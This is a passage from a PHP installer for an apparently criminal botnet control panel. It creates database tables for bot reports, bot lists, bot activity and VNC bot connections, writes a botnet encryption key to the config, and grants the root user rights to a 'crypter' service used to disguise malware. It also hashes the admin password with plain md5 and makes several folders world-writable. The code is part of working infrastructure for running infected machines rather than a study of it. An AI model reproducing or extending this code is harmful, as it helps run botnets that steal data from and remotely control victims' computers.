    @mysql_query("ALTER DATABASE `{$db}` CHARACTER SET ".MYSQL_CODEPAGE." COLLATE ".MYSQL_COLLATE);
  }

	/* Rename columns (by chance :)
	 * Do it BEFORE table create/update or it will add more columns
	 */
	@mysql_query('ALTER TABLE `vnc_bot_connections` CHANGE `port` `my_port`	SMALLINT	UNSIGNED	NOT NULL;'); # TODO: remove in the nearest future!


  //Обрабатываем таблицы.
  if(!$error)foreach($_TABLES as $table => $v)
  {
    //Заполнение таблицы ipv4toc.
    if(strcmp($table, 'ipv4toc') == 0)
    {
      ShowProgress("Filling table ".THEME_STRING_BOLD_BEGIN."'{$table}'".THEME_STRING_BOLD_END.".");
    
      if(($list = @file(FILE_GEOBASE)) === false)
      {
        ShowError("Failed to open file '".FILE_GEOBASE."'.");
        //$error = true;
      }
      elseif (FALSE === $list_names = @file(FILE_GEOBASE_NAMES)){ 
		ShowError("Failed to open file '".FILE_GEOBASE_NAMES."'.");
	 }
      else
      {
		if(($error = !CreateTable($table)))break;

		# Load country names
		$country_names_map = array();
		foreach ($list_names as $l)
			if (strlen($l = trim($l))){
				list($c2, $cfull) = explode(',', $l);
				$country_names_map[ strtoupper($c2) ] = trim($cfull, "\"\r\n\t ");
				};
		
		/*
		foreach($list as $item)
		{
			$cn = explode("\0", $item, 3);
			if(($error = !AddRowToTable($table, "l='{$cn[0]}', h='{$cn[1]}', c='".substr(trim($cn[2]), 0, 2)."'")))break;
		}*/
		/* this works 15 times faster */
		$insert = 'INSERT DELAYED INTO `ipv4toc` VALUES ';
		$inserts = array();
		foreach ($list as $item){
			$cn = explode("\0", $item, 3);
			$cn[2] = substr(trim($cn[2]), 0, 2);
			$cfull = (empty($country_names_map[$cn[2]])) ? $cn[2] : mysql_real_escape_string($country_names_map[$cn[2]]);
			$inserts[] = "('{$cn[0]}', '{$cn[1]}', '{$cn[2]}', '$cfull')";
			if (count($inserts)>100){
				mysql_query($insert.implode(',', $inserts));
				$inserts = array();
				}
			}
		mysql_query($insert.implode(',', $inserts)); 
        unset($list);
      }
    }
    //Обновляем старые таблицы отчетов.
    else if(strcmp($table, 'botnet_reports') == 0)
    {
      if(($error = !CreateTable($table)))break;
      $rlist = listReportTables($pd_mysql_db);
      foreach($rlist as $rtable)if(($error = !UpdateTableEx($rtable, 'botnet_reports')))break;
    }
    else $error = !($is_update ? UpdateTable($table) : CreateTable($table));
    
    if($error)break;
  }
  
if(!$error){
  //Создание директории для отчетов.
  if(!$error)$error = !CreatePath($pd_reports_path, isset($config['reports_path']) ? $config['reports_path'] : 0);

  //Обновление файла конфигурации.
  if(!$error)
  {
    ShowProgress("Writing config file");
    
    $updateList['mysql_host']      = $pd_mysql_host;
    $updateList['mysql_user']      = $pd_mysql_user;
    $updateList['mysql_pass']      = $pd_mysql_pass;
    $updateList['mysql_db']        = $pd_mysql_db;
    $updateList['reports_path']    = $pd_reports_path;
    $updateList['reports_to_db']   = $pd_reports_to_db ? 1 : 0;
    $updateList['reports_to_fs']   = $pd_reports_to_fs ? 1 : 0;
    $updateList['botnet_timeout']  = ((int)($pd_botnet_timeout * 60));
    $updateList['botnet_cryptkey'] = $pd_botnet_cryptkey;
  
    if(!updateConfig($updateList))
    {
      ShowError("Failed write to config file.");
      $error = true;
    }
  }

  //Добавление пользователя в базу.
  if(!$error && !$is_update)
  {
    ShowProgress("Adding user ".THEME_STRING_BOLD_BEGIN."'{$pd_user}'".THEME_STRING_BOLD_END.".");
    $error = !AddRowToTable('cp_users', "name='".addslashes($pd_user)."', pass='".md5($pd_pass)."', comment='Default user'");
  }
  
  //Выставляем прозрачно права на каталог для временных файлов.
  @chmod('../tmp', 0777);
  
	# Utility statements
	ShowProgress("Searching for the god particle...");
	$querys = <<<SQL
		/* Grant the 1st user with additional permissions */
		SELECT MIN(`id`) FROM `cp_users` INTO @primary_user ;;;
		UPDATE `cp_users`
			SET 
				`r_svc_notes`=1,
				`r_svc_crypter_crypt`=1, `r_svc_crypter_pay`=1
			WHERE `id`=@primary_user ;;;

		/* Fill with initial data */
		INSERT DELAYED IGNORE INTO `botnet_activity`
		SELECT `bot_id`, "2012-06-01", `rtime_first`, `rtime_last`, 0, 0, 0
		FROM `botnet_list`
		WHERE `rtime_first` <= UNIX_TIMESTAMP("2012-06-01");;;
SQL;
		foreach (explode(';;;', $querys) as $id => $q)
			if (strlen($q = trim($q)))
				if (!mysql_query($q))
					ShowError("Utility query #$id error: ".mysql_error());
	}

  // Каталог данных
  if(!$error){
	$error = !CreatePath('system/data', 0);
	@chmod('../system/data', 0777);
	if (!$error && !is_writable('../system/data')) 
		ShowError('system/data Must be writable! chmod it to 0777');
	}

	if(!$error){
		$error = !CreatePath('public', 0);
		@chmod('../public', 0777);
		if (!$error && !is_writable('../public'))
			ShowError('public/ Must be writable! chmod it to 0777');
		}
  
  //Успешное завершение.
  if(!$error)
  {
    $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.
                  str_replace('{TEXT}', THEME_STRING_BOLD_BEGIN.($is_update ? '-- Update complete! --' : '-- Installation complete! --').THEME_STRING_BOLD_END, THEME_DIALOG_ITEM_SUCCESSED).
                THEME_DIALOG_ROW_END;
    themeSmall(APP_TITLE, $_OUTPUT.THEME_DIALOG_END, 0, 0, 0);
    die();
  }
  $_OUTPUT .= THEME_DIALOG_END.THEME_VSPACE;
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Основной диалог.
///////////////////////////////////////////////////////////////////////////////////////////////////

if($is_update)
{
  @include_once(FILE_CONFIG);
  if(isset($config['mysql_db']))$pd_mysql_db = $config['mysql_db'];
}

if($is_update)$help =  "This application update/repair and reconfigure your control panel on this server. If you want make new installation, please remove file '".FILE_CONFIG."'.";
else          $help =  "This application install and configure your control panel on this server. Please type settings and press 'Install'.";

$_FORMITEMS = '';

//Данные юзера.
if(!$is_update)
{
  $_FORMITEMS .=
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Root user:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'User name: (1-20 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_user), 'user', '20', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Password (6-64 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_pass), 'pass', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//База данных.
$_FORMITEMS .= 
THEME_DIALOG_ROW_BEGIN.
  str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'MySQL server:'), THEME_DIALOG_GROUP_TITLE);
          
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'Host:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_host), 'mysql_host', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'User:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_user), 'mysql_user', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'Password:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_pass), 'mysql_pass', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END;
}     

$_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'Database:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_db), 'mysql_db', '64', DIALOG_INPUT_WIDTH), $is_update ? THEME_DIALOG_ITEM_INPUT_TEXT_RO : THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_GROUP_END.
THEME_DIALOG_ROW_END;
          
//Локальные пути.     
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Local folders:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Reports:', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_reports_path), 'path_reports', '255', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//Опции.
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Options:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Online bot timeout:', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_botnet_timeout), 'botnet_timeout', '4', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Encryption key (1-255 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_botnet_cryptkey), 'botnet_cryptkey', '255', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'reports_to_db', '', 'Enable write reports to database.'), $pd_reports_to_db ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'reports_to_fs', '', 'Enable write reports to local path.'), $pd_reports_to_fs ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//Форма.
$_OUTPUT .= 
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('idata', basename($_SERVER['PHP_SELF']), ''), THEME_FORMPOST_BEGIN).
str_replace('{WIDTH}', DIALOG_WIDTH, THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, APP_TITLE), THEME_DIALOG_TITLE).
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', $help, THEME_DIALOG_ITEM_WRAPTEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END.
  $_FORMITEMS.
  str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
   str_replace(array('{TEXT}', '{JS_EVENTS}'), array(($is_update ? '-- Update --' : '-- Install --'), ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
  THEME_DIALOG_ACTIONLIST_END.
THEME_DIALOG_END.
THEME_FORMPOST_END;

//Вывод.
themeSmall(APP_TITLE, $_OUTPUT, 0, 0, 0);
?>